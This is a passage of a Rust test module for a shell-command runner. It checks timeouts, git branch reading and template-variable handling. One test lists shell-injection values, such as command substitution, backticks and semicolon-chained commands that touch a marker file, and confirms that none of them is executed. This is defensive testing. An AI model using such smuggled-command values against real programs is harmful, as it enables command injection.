        assert_eq!(clamp_timeout(Some(0)), DEFAULT_TIMEOUT_SECS);
        assert_eq!(clamp_timeout(Some(5)), 5);
        assert_eq!(clamp_timeout(Some(u64::MAX)), MAX_TIMEOUT_SECS);
    }

    #[test]
    fn git_branch_reads_head() {
        let root = std::env::temp_dir().join(format!("wp53-git-{}", std::process::id()));
        let git = root.join(".git");
        std::fs::create_dir_all(&git).unwrap();
        std::fs::write(git.join("HEAD"), "ref: refs/heads/feat/x\n").unwrap();
        assert_eq!(git_branch_at(&root).as_deref(), Some("feat/x"));
        std::fs::write(git.join("HEAD"), "0123456789abcdef\n").unwrap();
        assert_eq!(git_branch_at(&root), None);
        let _ = std::fs::remove_dir_all(&root);
        assert_eq!(git_branch_at(&root), None);
    }

    #[cfg(unix)]
    fn tmp_run(command: &str) -> PinnedShellRun {
        PinnedShellRun {
            command: command.into(),
            cwd: Some(std::env::temp_dir().display().to_string()),
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn exec_runs_in_cwd_and_captures() {
        let result = exec(
            &tmp_run("pwd; echo err 1>&2; exit 3"),
            &HashMap::new(),
            Some(10),
            None,
        )
        .await;
        assert!(!result.ok);
        assert_eq!(result.exit_code, Some(3));
        assert_eq!(result.stderr.trim(), "err");
        assert!(!result.stdout.trim().is_empty());
        assert_eq!(result.shell, "sh");
        assert_eq!(result.refusal, None);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn hostile_values_are_never_executed() {
        let marker = std::env::temp_dir().join(format!("wp53-pwned-{}", std::process::id()));
        let m = marker.display().to_string();
        let hostiles = [
            format!("$(touch {m})"),
            format!("`touch {m}`"),
            format!("a; touch {m}"),
            format!("a\ntouch {m}"),
            format!("a\" ; touch {m}; echo \""),
            format!("a' ; touch {m}; echo '"),
            "*".to_string(),
        ];
        for template in [
            "printf '%s' {{selection}}",
            "printf '%s' \"{{selection}}\"",
            "printf '%s' \"<{{selection}}>\"",
        ] {
            for hostile in &hostiles {
                let result = exec(
                    &tmp_run(template),
                    &vars(&[("selection", hostile.as_str())]),
                    Some(10),
                    None,
                )
                .await;
                let expected = if template.contains('<') {
                    format!("<{hostile}>")
                } else {
                    hostile.clone()
                };
                assert_eq!(result.stdout, expected, "template {template:?}");
                assert!(
                    !marker.exists(),
                    "value was executed: {hostile:?} via {template:?}"
                );
            }
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn a_variable_in_single_quotes_is_refused_before_spawning() {
        let result = exec(
            &tmp_run("echo '{{selection}}'"),
            &vars(&[("selection", "x")]),
            Some(10),
            None,
        )
        .await;
        assert_eq!(result.refusal.as_deref(), Some("variable-in-single-quotes"));
        assert!(result.stdout.is_empty());
        assert_eq!(result.exit_code, None);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn exec_times_out_and_kills_the_group() {
        let result = exec(
            &tmp_run("sleep 30 & sleep 30"),
            &HashMap::new(),
            Some(1),
            None,
        )
        .await;
        assert!(result.timed_out);
        assert!(!result.ok);
    }
}
